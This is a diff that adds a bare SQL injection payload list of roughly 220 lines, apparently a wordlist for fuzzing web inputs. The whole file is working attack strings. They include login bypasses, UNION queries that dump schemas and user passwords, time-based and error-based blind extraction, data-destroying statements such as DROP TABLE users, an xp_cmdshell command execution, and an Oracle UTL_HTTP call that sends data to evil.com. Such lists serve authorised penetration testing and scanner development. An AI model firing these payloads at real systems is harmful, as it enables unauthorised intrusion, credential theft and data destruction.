@@ -1,0 +1,221 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" #
+" OR 1=1--
+' OR 1=1--
+" OR 1=1#
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+admin' --
+admin" --
+admin'#
+admin"#
+admin'/*
+admin"/*
+' or 1=1 --
+" or 1=1 --
+' or 1=1#
+" or 1=1#
+' or '1'='1
+" or "1"="1
+' or 'x'='x
+" or "x"="x
+') or ('1'='1
+") or ("1"="1
+' OR 'a'='a
+" OR "a"="a
+') OR ('a'='a
+") OR ("a"="a
+1' OR '1' = '1
+1" OR "1" = "1
+' OR 1 = 1 --
+" OR 1 = 1 --
+1' or '1' = '1'--
+1" or "1" = "1"--
+1' or '1' = '1' or '1' = '1
+1" or "1" = "1" or "1" = "1
+1 or 1=1
+1 or 1=1--
+1 or 1=1#
+1 or 1=1/*
+1' AND '1' = '1
+1" AND "1" = "1
+1' AND '1' = '2
+1" AND "1" = "2
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+-1' UNION SELECT NULL--
+-1' UNION SELECT NULL,NULL--
+-1' UNION SELECT NULL,NULL,NULL--
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+1' AND 1=1--
+1' AND 1=2--
+1" AND 1=1--
+1" AND 1=2--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 10--
+' ORDER BY 20--
+' ORDER BY 100--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+'; DROP TABLE users--
+"; DROP TABLE users--
+'; DELETE FROM users--
+"; DELETE FROM users--
+'; TRUNCATE TABLE users--
+"; TRUNCATE TABLE users--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT user))--
+' AND 1=CONVERT(int,(SELECT database()))--
+' WAITFOR DELAY '00:00:05'--
+'; WAITFOR DELAY '00:00:05'--
+1'; WAITFOR DELAY '00:00:05'--
+1' AND SLEEP(5)--
+1' AND BENCHMARK(10000000,MD5('a'))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND pg_sleep(5)--
+1' AND pg_sleep(5)--
+1'||'1
+1'||UTL_INADDR.get_host_name((select banner from v$version where rownum=1))||'
+' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND 1=2 UNION SELECT NULL,NULL,NULL--
+' AND 1=2 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' AND 1=2 UNION SELECT column_name,NULL,NULL FROM information_schema.columns--
+' AND 1=2 UNION SELECT user(),database(),version()--
+' AND 1=2 UNION SELECT user,password,NULL FROM mysql.user--
+admin'
+admin' or '1'='1
+admin') or ('1'='1
+admin') or 1=1--
+1'1
+' and 1=1
+' and 1=2
+1' and '1'='1
+1' and '1'='2
+1 and 1=1
+1 and 1=2
+' or ''='
+' or 0=0 --
+" or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 --
+or 0=0 #
+' or 1=1
+" or 1=1
+' or 1=1 --
+" or 1=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+Hi' or 'a'='a
+' having 1=1--
+' group by userid having 1=1--
+' SELECT * FROM members WHERE username = 'admin'--
+' EXEC sp_addlogin 'name', 'password'
+' EXEC master..xp_cmdshell 'dir'--
+' UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+') union select * from information_schema.tables--
+' union select null, table_name from information_schema.tables--
+' union select null, column_name from information_schema.columns where table_name='users'--
+' union select username, password from users--
+' union select 1,2,3,4,5--
+' union select null,null,null,null,version()--
+' union select null,null,null,null,user()--
+' union select null,null,null,null,database()--
+1' union select null, table_name from information_schema.tables--
+1' union select null, column_name from information_schema.columns--
+1' union all select null,null,null,concat(table_name) from information_schema.tables--
+-1' union select null,null,null,null,version()--
+' and (select count(*) from information_schema.tables) > 0--
+' AND (SELECT COUNT(*) FROM sysobjects) > 0--
+' AND (SELECT COUNT(*) FROM sysusers) > 0--
+1'||(SELECT version())||'
+1'||(SELECT user())||'
+1'||(SELECT database())||'
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 64--
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 96--
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 112--
+' AND 1=(SELECT COUNT(*) FROM tablenames)--
+' AND 1=(SELECT COUNT(*) FROM tabname)--
+1' AND EXISTS(SELECT * FROM users)--
+1' AND EXISTS(SELECT username FROM users WHERE username='admin')--
+' OR EXISTS(SELECT 1/0 FROM users)--
+' UNION SELECT NULL WHERE 1=2--
+' UNION SELECT NULL,NULL WHERE 1=2--
+1'; INSERT INTO users (username,password) VALUES ('hacker','password')--
+1'; UPDATE users SET password='hacked' WHERE username='admin'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)='
+1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
+1' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--
+1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)--
+1' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--
+' AND (SELECT 1 FROM dual WHERE 1=1) --
+' AND (SELECT 1 FROM dual WHERE 1=2) --
+1' AND MAKE_SET(1=1,version())--
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+1' XOR (SELECT 1 FROM dual WHERE 1=1)--
+1'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=1--
+' AND UTL_INADDR.get_host_name((SELECT user FROM dual))='1
+' AND UTL_HTTP.REQUEST('http://evil.com/'||(SELECT user FROM dual))='1
+admin'--
+admin'#
+admin'/*
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or '1'='1'--
+admin') or 1=1--
+') or ('a'='a') and ('1
+' OR SUBSTRING(@@version,1,1)='5
+' OR SUBSTRING(@@version,1,1)='4
+' OR MID(version(),1,1)='5
+' OR MID(version(),1,1)='4
+' OR LEFT(version(),1)='5
+' OR LEFT(version(),1)='4
